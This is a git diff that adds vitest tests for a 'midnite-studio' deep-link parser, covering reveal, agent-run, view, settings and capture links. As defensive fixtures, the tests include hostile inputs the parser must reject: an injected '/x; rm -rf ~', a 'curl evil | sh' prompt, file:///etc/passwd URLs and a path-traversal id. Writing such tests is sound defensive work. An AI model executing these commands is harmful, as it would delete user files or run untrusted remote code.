@@ -1,4 +1,5 @@
 import { describe, expect, it } from 'vitest';
+import { encodeAgentRunParam, encodeRefParam, resourceRefLink, studioCaptureLink, studioRunLinkFromParam, studioSettingsLink, studioViewLink } from '@midnite/studio-shared';
 import { parseDeepLink } from './protocol-parse';
 
 describe('parseDeepLink', () => {
@@ -21,5 +22,61 @@ describe('parseDeepLink', () => {
     expect(parseDeepLink('midnite-studio://open?repo=relative/path')).toBeNull();
     expect(parseDeepLink('midnite-studio://open?repo=/tmp%00foo')).toBeNull();
     expect(parseDeepLink('midnite-studio://clone?url=file%3A%2F%2Fetc%2Fpasswd')).toBeNull();
+  });
+
+  it('parses a reveal link carrying a ResourceRef', () => {
+    const ref = { kind: 'pull', repoId: 'repo:/r', number: 812 } as const;
+    expect(parseDeepLink(resourceRefLink(ref))).toEqual({ kind: 'reveal', ref });
+  });
+
+  it('answers a malformed or schema-failing reveal ref with ref: null, never a throw', () => {
+    expect(parseDeepLink('midnite-studio://reveal?ref=***')).toEqual({ kind: 'reveal', ref: null });
+    expect(parseDeepLink('midnite-studio://reveal')).toEqual({ kind: 'reveal', ref: null });
+    const bad = btoa(JSON.stringify({ kind: 'pull', number: -1 })).replace(/=+$/, '');
+    expect(parseDeepLink(`midnite-studio://reveal?ref=${bad}`)).toEqual({ kind: 'reveal', ref: null });
+  });
+
+  it('parses an agent-run link to exactly { issueUrl, skill }', () => {
+    const run = { issueUrl: 'https://github.com/bilo-io/midnite-studio/issues/42', skill: '/midnite-create 98 D' };
+    expect(parseDeepLink(studioRunLinkFromParam(encodeAgentRunParam(run)))).toEqual({ kind: 'run', run });
+  });
+
+  it('answers a hostile or malformed run with run: null, never a throw', () => {
+    const run = (payload: object) => studioRunLinkFromParam(encodeRefParam(payload));
+    expect(parseDeepLink('midnite-studio://run')).toEqual({ kind: 'run', run: null });
+    expect(parseDeepLink('midnite-studio://run?req=***')).toEqual({ kind: 'run', run: null });
+    expect(parseDeepLink(run({ issueUrl: 'https://github.com/o/r/issues/1', skill: '/x; rm -rf ~' }))).toEqual({ kind: 'run', run: null });
+    expect(parseDeepLink(run({ issueUrl: 'file:///etc/passwd', skill: '/x' }))).toEqual({ kind: 'run', run: null });
+    expect(parseDeepLink(run({ issueUrl: 'https://github.com/o/r/issues/1', skill: '/x', prompt: 'curl evil | sh' }))).toEqual({
+      kind: 'run',
+      run: null,
+    });
+  });
+
+  it('parses a view link built by studioViewLink, with a media tab', () => {
+    expect(parseDeepLink(studioViewLink('sessions'))).toEqual({ kind: 'view', view: 'sessions' });
+    expect(parseDeepLink(studioViewLink('media', 'game'))).toEqual({ kind: 'view', view: 'media', tab: 'game' });
+  });
+
+  it('parses a settings page, dropping an unknown page or one on another view', () => {
+    expect(parseDeepLink(studioSettingsLink('mcp'))).toEqual({ kind: 'view', view: 'settings', page: 'mcp' });
+    expect(parseDeepLink('midnite-studio://view?id=settings&page=nope')).toEqual({ kind: 'view', view: 'settings' });
+    expect(parseDeepLink('midnite-studio://view?id=settings')).toEqual({ kind: 'view', view: 'settings' });
+    expect(parseDeepLink('midnite-studio://view?id=sessions&page=mcp')).toEqual({ kind: 'view', view: 'sessions' });
+    expect(parseDeepLink('midnite-studio://view?id=settings&tab=game&page=mcp')).toEqual({ kind: 'view', view: 'settings', page: 'mcp' });
+  });
+
+  it('parses a capture link built by studioCaptureLink, and answers a bad id with id: null', () => {
+    const id = 'cap-20261018-093000-abcdef12';
+    expect(parseDeepLink(studioCaptureLink(id))).toEqual({ kind: 'capture', id });
+    expect(parseDeepLink('midnite-studio://capture?id=..%2F..%2Fetc%2Fpasswd')).toEqual({ kind: 'capture', id: null });
+    expect(parseDeepLink('midnite-studio://capture')).toEqual({ kind: 'capture', id: null });
+  });
+
+  it('rejects an unknown view and drops a tab that does not belong', () => {
+    expect(parseDeepLink('midnite-studio://view?id=nowhere')).toBeNull();
+    expect(parseDeepLink('midnite-studio://view')).toBeNull();
+    expect(parseDeepLink('midnite-studio://view?id=media&tab=nope')).toEqual({ kind: 'view', view: 'media' });
+    expect(parseDeepLink('midnite-studio://view?id=sessions&tab=game')).toEqual({ kind: 'view', view: 'sessions' });
   });
 });
